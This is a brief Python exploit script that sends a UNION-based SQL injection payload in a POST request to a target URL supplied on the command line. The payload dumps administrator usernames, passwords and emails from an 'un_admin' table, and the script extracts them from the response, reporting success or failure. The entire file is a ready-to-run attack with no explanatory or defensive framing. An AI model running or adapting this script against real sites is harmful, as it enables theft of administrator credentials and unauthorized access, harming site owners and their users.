import sys
import requests
import re
url = sys.argv[1]+"/?m=xxxxxx"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'}
payload = {'uid': '1 union select group_concat(username,0x7C,password,0x7C,email) from un_admin-- - -',
           'bypass': '/**/'}
response = requests.post(url, data=payload, headers=headers)
result = str((re.findall('\[{"lottery":{"id":"(.*?)"', response.text))).replace(',','\n')
if len(result)>2:
    print("success!")
    print(result.replace('\'',''))
else:
    print("failed!")